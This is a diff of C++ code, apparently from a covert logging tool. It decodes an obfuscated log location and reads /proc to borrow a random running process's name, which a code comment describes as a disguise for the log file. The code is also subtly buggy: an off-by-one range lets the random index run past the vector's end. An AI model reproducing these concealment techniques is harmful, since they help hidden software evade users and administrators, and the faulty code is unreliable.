@@ -38,6 +38,8 @@
 #include <unistd.h>
 #include <chrono>
 #include <vector>
+#include <dirent.h>
+#include <map>
 
 using namespace std;
 
@@ -55,27 +57,53 @@ string getLogfilename()
    int choice = rand() % range;   
 
    // unobfuscate location
-   //vector <string> locations;
-   //for (string rotlocation : rotlocations)
-   //{
-      string location;
-      for (char rotletter : rotlocations[choice])
-      {
-         location.push_back(rotletter + 3);
-      }
-      //locations.push_back(location);
-      cout << location;
-   //}
-   return location;
-    //locations = [ x.decode('base64') for x in rotlocations ]
-    //randomlocation = choice(locations)
+   string location;
+   for (char rotletter : rotlocations[choice])
+   {
+      location.push_back(rotletter + 3);
+   }
 
-    // # choose name of log file from running processes
-    // rpids = pids()
-    // randompid = choice(rpids)
-    // processcommand = Process(randompid)
-    // processname = processcommand.name()
-    // processname = path.basename(processname)
+   // choose name of log file from running processes
+   // read all numeric pid folder names from /proc into rpids vector
+   DIR *proc_dp = NULL;
+   struct dirent *proc_dptr = NULL;
+   vector <string> rpids;
+   
+   proc_dp = opendir("/proc/");
+   while (NULL != (proc_dptr = readdir(proc_dp) ))
+   {
+      if ( proc_dptr->d_name[0] > 48 && proc_dptr->d_name[0] < 58)
+      {
+         string piddir = "/proc/" + (string)proc_dptr->d_name + "/comm";
+         rpids.push_back(piddir);
+         //cout << piddir;
+      }
+   }
+   closedir(proc_dp);
+
+   // choose random process to copy name as a disguise
+   //add do while here<<<<
+   int prange = rpids.size() -0 + 1; //inclusive
+   int pchoice = rand() % prange;
+
+   // read /proc/<random_pid>/comm file to get processname
+   ifstream pidcomm;
+   pidcomm.open(rpids[pchoice]);
+   if (!pidcomm)
+   {
+      cerr << "unable to open comm file";
+      exit(1);
+   }
+
+   string processname;
+   while (pidcomm >> processname)
+   {
+      cout <<processname;
+   }
+   pidcomm.close();
+
+   return location; //temporary
+
     // # remove any unwanted characters
     // processname = sub('[:()]', '', processname)
     // logfilename = randomlocation+"/"+processname
@@ -128,7 +156,7 @@ int main()
    ifstream comm("/proc/self/comm");
    string processname;
    getline(comm, processname);
-   cout << processname << "\n";
+   //cout << processname << "\n";
    string processinfo = "\nProcess is running with pid: " + to_string(processpid) + "\nProcess is running with name: " + processname + "\n";
    addCleanup(processinfo, cleanuplog);
 
